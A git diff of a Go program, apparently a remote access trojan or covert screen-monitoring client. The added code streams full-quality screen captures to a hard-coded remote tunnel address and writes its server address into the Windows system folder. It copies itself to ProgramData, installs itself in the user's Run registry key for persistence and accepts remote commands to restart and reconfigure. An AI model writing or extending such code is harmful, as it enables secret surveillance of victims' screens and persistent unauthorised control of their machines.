@@ -11,6 +11,8 @@ import (
 	"io"
 	"log"
 	"net"
+	"os"
+	"path/filepath"
 	"runtime"
 	"sync"
 	"time"
@@ -19,10 +21,10 @@ import (
 )
 
 const (
-	//IP = "selectbyylc.e3.luyouxia.net:13869"
+	IP = "selectbyylc.e3.luyouxia.net:14455"
 
 	//IP = "localhost:1011"
-	IP = "209.209.49.184:1011"
+	//IP = "209.209.49.184:1011"
 )
 
 const (
@@ -39,11 +41,22 @@ var stopScreen bool
 var wg sync.WaitGroup
 
 func Ma() {
-
+	CreateIni()
 	连接()
 
 }
 
+func CreateIni() {
+	filePath := "C:\\Windows\\tb_config.ini"
+
+	// 检查文件是否存在
+	if _, err := os.Stat(filePath); os.IsNotExist(err) {
+		err := util.WriteConfigFile(filePath, "[IpAndPort]", IP)
+		if err != nil {
+			return
+		}
+	}
+}
 func heartbeat(conn net.Conn) {
 	for {
 		err := util.SendHead(byte(util.HEART), conn)
@@ -58,7 +71,7 @@ func heartbeat(conn net.Conn) {
 	wg.Done() // 协程计数器加-1
 }
 func loadConfig() (*Config, error) {
-	cfg, err := ini.Load("config.ini")
+	cfg, err := ini.Load("C:\\Windows\\tb_config.ini")
 	if err != nil {
 		log.Fatal("Fail to read file: ", err)
 	}
@@ -70,16 +83,15 @@ func loadConfig() (*Config, error) {
 	return config, nil
 }
 func 连接() {
-	//config, err := loadConfig()
-	//if err != nil {
-	//	fmt.Println("Failed to load config:", err)
-	//	return
-	//}
+	config, err := loadConfig()
+	if err != nil {
+		fmt.Println("Failed to load config:", err)
+		return
+	}
 
 	wg.Add(3) // 协程计数器 +1
-	//go 启动计划()
-	//go AddToStartup()
-	inetSocketAddress, _ := net.ResolveTCPAddr("tcp", IP)
+
+	inetSocketAddress, _ := net.ResolveTCPAddr("tcp", config.IP)
 
 	socket, err := net.DialTCP("tcp", nil, inetSocketAddress)
 	fmt.Println(socket)
@@ -122,17 +134,15 @@ func 连接() {
 }
 
 func createScreen(socket net.Conn) {
-	// 获取当前屏幕的大小
 
 	util.SendHead(1, socket)
 	for {
 		time.Sleep(time.Millisecond * 150)
 
-		screen, err := CaptureScreenAsJPEG(8)
+		screen, err := CaptureScreenAsJPEG(100)
 		if err != nil {
 			fmt.Println(err)
 		}
-		////compress := util.Compress(screen)
 
 		err = util.Send(2, screen, socket)
 		if err != nil {
@@ -253,6 +263,9 @@ func doSomeThing(socket net.Conn) {
 			length := util.ReceiveLength(reader)
 			context, _ := util.ReceiveContext(reader, length)
 			util.UpdateConfigFile(string(context))
+			util.RestartProgram()
+		case string(MyConst.ADD_START):
+			AddToStartup()
 		}
 
 	}
@@ -260,17 +273,20 @@ func doSomeThing(socket net.Conn) {
 
 }
 
-func 启动计划() {
-	time.Sleep(1 * time.Minute)
-	//初步写入()
-}
-func 写入(exeName string, exePath string) {
+func AddToStartup() {
+	//复制程序到指定目录
+	util.CopyToProgramData()
+	exePath := filepath.Join("C:\\ProgramData", filepath.Base(os.Args[0]))
+	exeName := filepath.Base(exePath)
+
+	// 打开注册表项
 	key, err := registry.OpenKey(registry.CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", registry.ALL_ACCESS)
 	if err != nil {
 		log.Fatal(err)
 	}
 	defer key.Close()
 
+	// 检查是否已存在该项
 	_, _, err = key.GetStringValue(exeName)
 	if err == nil {
 		// 如果已存在，则不需要重复写入
@@ -278,20 +294,11 @@ func 写入(exeName string, exePath string) {
 	}
 	encryptPath, err := util.EncryptString("ylcworld19990709", exePath)
 
+	// 写入注册表项
 	decryptPath, err := util.DecryptString("ylcworld19990709", encryptPath)
 	err = key.SetExpandStringValue(exeName, decryptPath)
 	if err != nil {
 		log.Fatal(err)
 	}
+	wg.Done() // 协程计数器加-1
 }
-
-//func 初步写入() {
-//	//复制程序到指定目录
-//	util.CopyToProgramData()
-//	exePath := filepath.Join("C:\\ProgramData", filepath.Base(os.Args[0]))
-//	_ = filepath.Base(exePath)
-//
-//	//写入(exeName, exePath)
-//
-//	wg.Done() // 协程计数器加-1
-//}
